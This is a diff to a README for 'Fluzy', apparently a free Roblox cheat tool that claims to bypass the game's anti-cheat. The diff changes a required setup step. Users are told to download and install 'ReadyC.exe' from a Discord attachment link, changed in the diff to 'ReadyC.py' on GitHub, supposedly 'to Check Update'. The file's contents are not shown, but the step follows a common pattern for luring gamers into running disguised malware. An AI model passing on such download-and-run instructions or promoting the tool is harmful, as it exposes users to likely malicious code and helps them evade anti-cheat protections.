@@ -13,9 +13,9 @@ Fluzy is a Free Roblox Exploit that bypasses byfron and easy to use ( Still in B
 
 #### Client Setup
 
-#### You need to Download and Install `ReadyC.exe` to Check Update
+#### You need to Download and Install `ReadyC.py` to Check Update
 
-[Click to Download](https://cdn.discordapp.com/attachments/1213046307929989161/1217859915239129128/ReadyC.exe?ex=66058f6e&is=65f31a6e&hm=eb95ef62950f09c18519cab8666d14e265a27dc70152a71d47781c5d7388a9a1&)
+[Click to Download](https://github.com/fluzydxv/Fluzy-Release-Windows-/blob/main/ReadyC.py)
 
 #### Final Setup
 
